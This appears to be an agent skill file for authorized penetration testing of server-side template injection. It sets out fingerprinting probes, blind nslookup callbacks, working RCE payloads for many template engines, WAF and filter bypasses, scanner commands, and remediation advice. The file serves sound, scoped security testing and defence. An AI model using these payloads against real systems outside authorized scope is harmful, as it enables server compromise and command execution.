---
name: web-ssti
description: "Server-side template injection testing for a pentest-team engagement — engine fingerprinting ({{7*7}}/${7*7}/decision-tree/error signatures), Jinja2/Twig/Freemarker/Velocity/Pebble/Thymeleaf/Smarty/Mako/ERB/Handlebars/EJS/Pug specifics, sandbox escape and object-model traversal, filter/WAF bypass, blind detection, and SSTI-to-RCE chains gated through the anchor. Load it when the appsec-triage input-validation sweep turns up an SSTI lead on a claimed web/API target."
---

# Server-Side Template Injection — under the engagement protocol

Deep methodology for the SSTI class. You reach here from the `appsec-triage` input-validation sweep with a lead on a surface you already own on the board.

## Under the engagement protocol

- **Claimed and in-scope only.** Run these against a target you own on the board and that is on the `ROE.md` allowlist — every probe, every render.
- **Prove with a marker, not a shell.** Arithmetic evaluation (`{{7*7}}`→`49`) plus an engine fingerprint and a single benign read (config key, `id`, a planted marker file) confirms the class. Never dump secrets or exfiltrate a data store to "demonstrate"; no-real-data means the proof is a marker or a hash.
- **Read before write; RCE is gated.** Code execution, file writes, reverse shells, and cloud-metadata pulls are destructive/outward-facing — mark the surface blocked and route through the lead to the anchor for the human's explicit go before firing them. A demonstrated *reachability* of the RCE primitive beats actually popping a shell on a production or restricted target.
- **OOB goes to a benign in-scope listener only.** DNS/HTTP callbacks confirm blind execution against *your own* in-scope collaborator/interactsh endpoint — never a live external pull, never real cloud credentials.
- **Rate-limit yourself.** Time-based probes (`range(99999999)`, sleeps) and automated scanners (tplmap/SSTImap) can hammer a shared target and trip a WAF ban for the whole team. Throttle, and coordinate load on the board.
- **Log and file** per PROTOCOL §Evidence and §Findings — findings in the `appsec-reporting` format, with a reproduction another operator could re-run.

## Quick workflow

1. Map every input reaching a renderer (URL params, POST body, JSON values, path segments, headers, cookies).
2. Inject polyglot + arithmetic probes; note evaluation, an error, or blank output.
3. Fingerprint the engine (decision tree, error signatures, variable probes) and confirm it is *server*-side, not client-side (AngularJS/Vue).
4. Escalate to benign info disclosure (config, env) to prove reach — stop there unless RCE is cleared.
5. If RCE is in scope and the anchor has given the go, run the engine-specific chain against a marker.
6. File the finding with a clean reproduction and remediation.

## Detection and fingerprinting

### Polyglot + arithmetic probes
```text
${{<%[%'"}}%\          Universal polyglot
{{7*7}}                49 => a double-curly engine evaluated it
{{7*'7'}}              7777777 => Jinja2/Nunjucks ; 49 => Twig
<%= 7*7 %>             ERB / EJS
#{7*7}                 Pebble / Pug / Thymeleaf
@(7+7)                 Razor (.NET)
```
Engine-narrowing: `{{config}}` (Flask), `{{_self.env}}` (Twig), `{$smarty.version}` (Smarty), `<#assign x=1>` then reference `x` (Freemarker), a dollar-curly `T(java.lang.Math).PI` (Thymeleaf/SpEL), a dollar-curly `self.module.__name__` (Mako).

### Decision tree
```text
{{7*7}} -> 49? YES -> {{7*'7'}}: "7777777"->Jinja2 ({{config}} narrows to Flask) | "49"->Twig | error->Handlebars
             NO  -> ${7*7}->49? Velocity/Thymeleaf/Freemarker/Mako (narrow via class-ref / T(Math).PI / <#assign> / "mako" error)
                    <%= 7*7 %>->49? ERB vs EJS (by error path) ; @(7+7)->14? Razor
```

### Error signatures (fingerprint for free)
`jinja2.exceptions.UndefinedError`→Jinja2, `Twig\Error\SyntaxError`→Twig, `freemarker.core.ParseException`→Freemarker, `org.apache.velocity.exception`→Velocity, `com.mitchellbosecke.pebble.error`→Pebble, `SmartyCompilerException`→Smarty, `mako.exceptions.SyntaxException`→Mako, `org.thymeleaf.exceptions.TemplateProcessing`→Thymeleaf, `Pug:Error`→Pug.

### Blind detection (benign, in-scope)
```text
{{range(99999999)|join}}            Jinja2 CPU delay — keep it short, back off a shared host
```
OOB to *your in-scope listener only*:
```text
{{self.__init__.__globals__.__builtins__.__import__('os').popen('nslookup UNIQUE.<in-scope-listener>').read()}}   # Jinja2
{{['nslookup UNIQUE.<in-scope-listener>']|map('system')}}                                                          # Twig
```
Error inference: compare `{{7*7}}` vs `{{7*'INVALID}}` — differing behavior confirms processing without any callback.

## Escalation — info disclosure first (benign, proves reach)

```python
{{config}}                                {{config['SQLALCHEMY_DATABASE_URI']}}   # Flask — read a single key to prove access, do not harvest
{{request.environ}}                       # WSGI env
```
```php
{{app.request.server.all|join(',')}}      {{dump(app)}}                            # Twig/Symfony
```
Reading one config value or a planted marker file proves the finding. Stop there unless RCE is cleared.

## RCE chains (gated — anchor go required, run against a marker)

These cross from read into code execution: do-no-harm applies, route through the lead to the anchor first. Replace `INDEX` with the runtime-enumerated value; never hardcode.

```python
# Jinja2 — object-model traversal
{{''.__class__.__mro__[1].__subclasses__()}}                       # enumerate to find Popen INDEX
{{''.__class__.__mro__[1].__subclasses__()[INDEX]('id',shell=True,stdout=-1).communicate()[0]}}
{{lipsum.__globals__.os.popen('id').read()}}                       # via lipsum global
{{cycler.__init__.__globals__.os.popen('id').read()}}              # via cycler (beats some sandboxes)
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
```
```php
{{'id'|filter('system')}}   {{['id']|map('system')|join}}          # Twig 2.x/3.x callbacks
{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id")}}   # Twig 1.x
```
```text
<#assign cmd="freemarker.template.utility.Execute"?new()>${cmd("id")}    # Freemarker
```
```java
#set($x=$class.inspect("java.lang.Runtime").type.getRuntime().exec("id"))               # Velocity
{{(1).TYPE.forName('java.lang.Runtime').methods[6].invoke(null,null).exec('id')...}}     # Pebble reflection
__${T(java.lang.Runtime).getRuntime().exec('id')}__::.x                                  # Thymeleaf SpEL preprocessing
```
```ruby
<%= system("id") %>   <%= `id` %>                                   # ERB
```
```javascript
{{range.constructor("return global.process.mainModule.require('child_process').execSync('id').toString()")()}}   # Nunjucks
<%= global.constructor.constructor('return process.mainModule.require("child_process").execSync("id")')() %>       # EJS
```
Use `id`/`whoami` as the marker command — never a destructive or availability-affecting one. A reverse shell, file write, or metadata pull is a *separate* anchor decision.

## Filter / WAF bypass (when a control sits in front)

Jinja2 when characters are blocked:
```python
{{''|attr('__cla'~'ss__')}}                          # tilde concat, dot blocked
{{()|attr(request.args.a)|attr(request.args.b)...}}  # smuggle names via ?a=__class__&b=__mro__
{{request['\x5f\x5fclass\x5f\x5f']}}                 # hex-encode underscores
```
Twig: `{{('sys'~'tem')('id')}}`. Thymeleaf: build strings from `T(Character).toString(105)...` to dodge keyword filters. Freemarker: `ObjectConstructor` when `?new()` is restricted.

WAF evasion: HTTP param pollution (`?name={{7*7}}&name=safe`), Content-Type confusion (submit JSON where a form-inspecting WAF looks), double URL-encoding (`%257B%257B7*7%257D%257D`), whitespace/newline injection (`{{ 7 * 7 }}`, `{{\n7*7\n}}`). Note in the finding that a WAF was present and what bypassed it — the client's control efficacy is itself reportable.

## Automation (throttled, in-scope)

```bash
python3 sstimap.py -u 'https://<in-scope>/page?name=test'          # auto-detect engine
python3 sstimap.py -u 'https://<in-scope>/page?name=test' -C 'id'  # single marker command (no --shell on a shared/prod host without the go)
python tplmap.py   -u 'https://<in-scope>/page?name=test'          # scan only
waybackurls <in-scope> | qsreplace 'ssti{{9*9}}' | ffuf -u FUZZ -mr 'ssti81'   # param discovery, throttled
```
Keep it single-threaded with a delay on shared/production targets; never point a scanner outside the allowlist, and do not let `--os-shell`/`-S` run before the anchor's go.

## Remediation (for the finding)

1. **Fix** — never concatenate user input into a template string; pass it as a bound *variable* (`render_template(...)`, not `render_template_string(user_input)`). Block `Template()`/`Environment.from_string()` on user input in CI.
2. **Defense in depth** — enable the engine sandbox (Jinja2 `SandboxedEnvironment`, Freemarker `SAFER_RESOLVER`), restrict Twig filters/functions to a safe allowlist, disable Smarty `{php}` and Thymeleaf SpEL preprocessing; run the app least-privilege with seccomp/AppArmor and a read-only root FS.
3. **Detection** — log/SIEM rule on template delimiters and object-model strings in user input (`{{`, `{%`, `<%`, `#{`, `__class__`, `__globals__`, `getRuntime`, `T(java.lang`), plus alerts on unexpected child processes (`sh`, `curl`, `nslookup`) from web workers.

Write it up in the `appsec-reporting` finding format, CWE-1336 / CWE-94 / A03:2021 Injection, with the marker-based reproduction.

## Related skills

- `web-rce` — escalation of a confirmed SSTI to code execution, and the do-no-harm gating that applies once you cross into RCE.
